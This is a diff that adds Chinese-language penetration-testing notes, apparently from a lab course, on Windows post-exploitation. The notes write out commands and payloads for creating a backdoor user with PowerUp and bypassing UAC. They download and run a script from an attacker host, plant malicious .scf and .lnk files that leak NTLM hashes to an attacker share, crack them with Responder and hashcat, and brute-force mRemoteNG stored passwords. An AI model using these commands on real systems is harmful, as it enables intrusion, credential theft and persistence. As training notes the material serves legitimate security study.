@@ -134,10 +134,104 @@ GUI注册表修改工具:
 在文件中输入 "cmd"
 执行
 使用像 Winpeas 和 PowerUp 这样的工具来识别操作系统内潜在的安全问题和漏洞
-        https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+        https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS        查注册表漏洞
         https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+                C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1        创建用户的程序
+                C:\Users\pmorgan\Desktop> Write-UserAddMSI                   启动程序
+        runas /user:backdoor cmd
+
+        C:\Users\Public> Import-Module .\Bypass-UAC.ps1                绕过UAC
+        C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
+                https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC
+
+其他资源:
+        https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/
+        https://node-security.com/posts/breaking-out-of-windows-environments/
+
 **
+工具 net-creds 可以在我们的攻击机上运行，从实时接口或 pcap 文件中嗅探密码和哈希
+
+用脚本来查找进程命令行。它每两秒捕获一次进程命令行，并将当前状态与先前状态进行比较，输出任何差异
+PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1') 
+___
+while($true)
+{
+
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
+
+}
+___
+
+Shell 命令文件 (Shell Command File, SCF) 被 Windows 资源管理器用来在目录间上下移动、显示桌面等
+
+创建以下文件，并将其命名为 @Inventory.scf 之类的名称（与目录中的另一个文件相似
+___
+[Shell]
+Command=2
+IconFile=\\10.10.14.3\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+___
+
+sudo responder -w -v -I tun0
+hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
+
+SCF 的方法在 Server 2019 主机上已不再有效，但我们可以使用恶意的 .lnk 文件
+___
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+___
 
 
+******
+信息搜刮 (Pillaging)
+已安装的应用程序
+已安装的服务
+网站
+文件共享
+数据库
+目录服务（例如 Active Directory、Azure AD 等）
+域名服务器
+部署服务
+证书颁发机构
+源代码管理服务器
+虚拟化
+消息传递
+监控和日志系统
+备份
+敏感数据
+键盘记录 (Keylogging)
+屏幕截图
+网络流量捕获
+以前的审计报告
+用户信息
+历史文件、感兴趣的文档（.doc/x、.xls/x、password./pass. 等）
+角色和权限
+Web 浏览器
+即时通讯客户端 (IM Clients)
+等等
 
 
+通过 PowerShell 和注册表项获取已安装的程序
+
+
+mRemoteNG 是一个用于管理和连接远程系统的工具，它使用 VNC、RDP、SSH 和类似协议
+默认情况下，配置文件位于 %USERPROFILE%\APPDATA\Roaming\mRemoteNG                        confCons.xml
+        python3 mremoteng_decrypt.py -s 'HASH'        如果用户没有设置自定义主密码
+        python3 mremoteng_decrypt.py -s 'HASH' -p PSWD        如果有
+                https://github.com/haseebT/mRemoteNG-Decrypt
+BF
+for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password;
+python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done 
+
+***
+Cookies
